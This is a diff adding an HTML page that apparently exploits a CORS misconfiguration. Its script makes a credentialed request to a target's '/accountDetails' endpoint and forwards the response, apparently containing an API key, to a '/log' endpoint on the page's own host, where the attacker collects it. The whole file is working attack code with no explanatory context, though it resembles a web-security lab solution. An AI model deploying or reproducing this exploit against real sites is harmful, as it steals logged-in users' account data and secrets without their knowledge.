@@ -1,0 +1,16 @@
+<html>
+<body>
+  <script>
+    var req = new XMLHttpRequest();
+    var url = ""
+    req.onreadystatechange = function(){
+      if (req.readyState == XMLHttpRequest.DONE){
+        fetch("/log?key=" + req.responseText)
+      }
+    }
+    req.open('GET', url + "/accountDetails", true);
+    req.withCredentials = true;
+    req.send(null);
+  </script>
+</body>
+</html>
